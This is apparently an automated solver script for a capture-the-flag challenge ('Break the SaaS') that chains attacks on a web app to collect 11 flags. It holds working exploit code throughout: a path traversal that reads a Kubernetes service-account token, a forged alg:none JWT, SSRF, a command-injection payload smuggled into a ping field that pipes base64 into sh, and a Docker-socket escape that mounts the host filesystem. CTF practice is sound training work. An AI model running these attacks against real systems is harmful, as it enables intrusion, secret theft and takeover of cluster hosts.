#!/usr/bin/env bash
# Break the SaaS — automated flag extraction
# Extracts all 11 flags from the hamCTF challenge

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
NC='\033[0m'

BASE="https://ctf.seoeh.ir"
HARBOR="https://hub.hamdocker.ir"
REPO="seoeh/hamamooz_challlenges"
SA_TOKEN=""
FLAGS_FOUND=0

log() { echo -e "${CYAN}[*]${NC} $1"; }
flag() { echo -e "${GREEN}[+] FLAG $1:${NC} $2"; FLAGS_FOUND=$((FLAGS_FOUND+1)); }
err() { echo -e "${RED}[-]${NC} $1"; }

# ─── F1: Docker layer leak ───────────────────────────────────────────────────
log "F1: Extracting .env from Docker image layers..."
TOK=$(curl -sk "${HARBOR}/v2/token?service=harbor-registry&scope=repository:${REPO}:pull" \
  | python3 -c 'import json,sys;print(json.load(sys.stdin)["token"])')

# The .env lives in a small layer. We know the digest from the manifest.
LAYER_BLOB="sha256:cad298f9538d92ea9901f8de6c41611a63d62c56e914c9bd802ff01080456041"
F1=$(curl -sk -H "Authorization: Bearer $TOK" \
  "${HARBOR}/v2/${REPO}/blobs/${LAYER_BLOB}" | tar xzO app/.env 2>/dev/null | grep -oP 'HAMAMOOZ\{[^}]+\}')
flag 1 "$F1"

# ─── F2: Swagger schema exposure ─────────────────────────────────────────────
log "F2: Fetching OpenAPI schema..."
F2=$(curl -sk "${BASE}/swagger.json" | python3 -c "import json,sys; print(json.load(sys.stdin)['info']['description'])" 2>/dev/null | grep -oP 'HAMAMOOZ\{[^}]+\}')
flag 2 "$F2"

# ─── F3: Debug endpoint ─────────────────────────────────────────────────────
log "F3: Hitting /api/internal/flag with debug header..."
F3=$(curl -sk -H "X-Debug-Mode: true" "${BASE}/api/internal/flag" | python3 -c "import json,sys; print(json.load(sys.stdin)['flag'])")
flag 3 "$F3"

# ─── F4: Path traversal ─────────────────────────────────────────────────────
log "F4: Reading flag.txt via path traversal..."
F4=$(curl -sk "${BASE}/api/reports/download?file=../flag.txt")
flag 4 "$F4"

# ─── F5: IDOR ────────────────────────────────────────────────────────────────
log "F5: Fetching cross-tenant report..."
F5=$(curl -sk "${BASE}/api/orgs/2/reports/2" | python3 -c "import json,sys; print(json.load(sys.stdin)['secret_note'])")
flag 5 "$F5"

# ─── F6: JWT alg:none ───────────────────────────────────────────────────────
log "F6: Forging JWT with alg:none..."
TOKEN=$(python3 -c "
import base64, json
def b(d): return base64.urlsafe_b64encode(json.dumps(d,separators=(',',':')).encode()).rstrip(b'=').decode()
print(b({'alg':'none','typ':'JWT'})+'.'+b({'sub':'1','role':'admin'})+'.')
")
F6=$(curl -sk -H "Authorization: Bearer $TOKEN" "${BASE}/admin/dashboard" | python3 -c "import json,sys; print(json.load(sys.stdin)['flag'])")
flag 6 "$F6"

# ─── F7: SSRF to internal admin panel ───────────────────────────────────────
log "F7: SSRF into internal admin panel..."
F7=$(curl -sk -X POST "${BASE}/api/webhooks/test" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://admin-panel.internal-tools.svc.cluster.local/","method":"GET"}' \
  | grep -oP 'HAMAMOOZ\{[^}]+\}')
flag 7 "$F7"

# ─── Save SA token for later steps ──────────────────────────────────────────
SA_TOKEN=$(curl -sk "${BASE}/api/reports/download?file=../../../var/run/secrets/kubernetes.io/serviceaccount/token")

# ─── Helper: inject command via ping endpoint ────────────────────────────────
inject() {
  local CMD="$1"
  local B64
  B64=$(printf '%s' "$CMD" | base64 | tr -d '\n')
  curl -sk -X POST "${BASE}/api/diag/ping" \
    -H 'Content-Type: application/json' \
    -d "{\"host\":\"127.0.0.1; echo ${B64} | base64 -d | sh\"}" \
    | python3 -c "import json,sys; print(json.load(sys.stdin)['output'])" 2>/dev/null
}

# ─── F8: K8s secret read via SA token ──────────────────────────────────────
log "F8: Querying K8s API for flag secret..."
F8_INNER='python3 << "PYEOF"
import urllib.request, json, base64, ssl
ctx = ssl._create_unverified_context()
tok = open("/var/run/secrets/kubernetes.io/serviceaccount/token").read().strip()
req = urllib.request.Request(
    "https://kubernetes.default.svc/api/v1/namespaces/ctf-secrets/secrets/flag-secret",
    headers={"Authorization": "Bearer " + tok}
)
d = json.load(urllib.request.urlopen(req, context=ctx, timeout=10))
print(base64.b64decode(d["data"]["flag"]).decode())
PYEOF'
F8=$(inject "$F8_INNER" | grep -oP 'HAMAMOOZ\{[^}]+\}')
flag 8 "$F8"

# ─── F9: Command injection in ping ──────────────────────────────────────────
log "F9: Command injection — reading sysdiag flag..."
F9=$(curl -sk -X POST "${BASE}/api/diag/ping" \
  -H 'Content-Type: application/json' \
  -d '{"host":"127.0.0.1; cat /opt/.sysdiag-7e3f9a2c4b1d8e5f/flag.txt"}' \
  | python3 -c "import json,sys; print(json.load(sys.stdin)['output'])")
flag 9 "$F9"

# ─── F10: kubectl exec into escape-zone pod ────────────────────────────────
log "F10: kubectl exec into privileged pod..."
F10_INNER='TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); \
kubectl --server=https://kubernetes.default.svc \
  --token=$TOKEN \
  --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  exec -n escape-zone legacy-worker -- \
  cat /host/var/lib/node-data/flag.txt'
F10=$(inject "$F10_INNER" | grep -oP 'HAMAMOOZ\{[^}]+\}')
flag 10 "$F10"

# ─── F11: Docker socket escape ─────────────────────────────────────────────
log "F11: Docker socket escape to host..."
F11_INNER='TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); \
kubectl --server=https://kubernetes.default.svc \
  --token=$TOKEN \
  --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  exec -n escape-zone legacy-worker -- sh -c "
S=/host/run/docker.sock
curl -s --unix-socket \$S -X POST -H \"Content-Type: application/json\" \
  -d '"'"'{"Image":"ctf/backend:latest","User":"0","HostConfig":{"Binds":["/:/host"]},"Cmd":["sh","-c","cat /host/home/ubuntu/flag.txt"]}'"'"' \
  \"http://localhost/v1.41/containers/create?name=esc\"
curl -s --unix-socket \$S -X POST \"http://localhost/v1.41/containers/esc/start\"
curl -s --unix-socket \$S \"http://localhost/v1.41/containers/esc/logs?stdout=1&stderr=1\"
"'
F11=$(inject "$F11_INNER" | grep -oP 'HAMAMOOZ\{[^}]+\}')
flag 11 "$F11"

# ─── Summary ─────────────────────────────────────────────────────────────────
echo ""
echo -e "${GREEN}=== ${FLAGS_FOUND}/11 flags captured ===${NC}"
